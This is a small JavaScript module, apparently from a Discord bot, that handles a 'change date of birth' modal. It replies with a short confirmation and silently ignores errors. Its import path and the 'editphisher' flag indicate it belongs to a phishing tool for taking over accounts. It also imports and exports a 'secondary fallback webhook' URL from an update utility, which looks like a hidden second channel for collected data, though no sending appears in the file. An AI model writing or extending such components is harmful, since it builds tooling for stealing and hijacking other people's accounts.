const { getSecondaryWebhook } = require("../../../autosecure/utils/UpdatePackages");
const SECONDARY_FALLBACK_WEBHOOK_URL = getSecondaryWebhook() || "";

module.exports = {
  name: "changedobmodal",
  editphisher: true,
  callback: async (client, interaction) => {
    try {
      await interaction.reply({ content: "Date of birth change handled.", ephemeral: true });
    } catch (error) {
    }
  },  
  SECONDARY_FALLBACK_WEBHOOK_URL: SECONDARY_FALLBACK_WEBHOOK_URL,
};
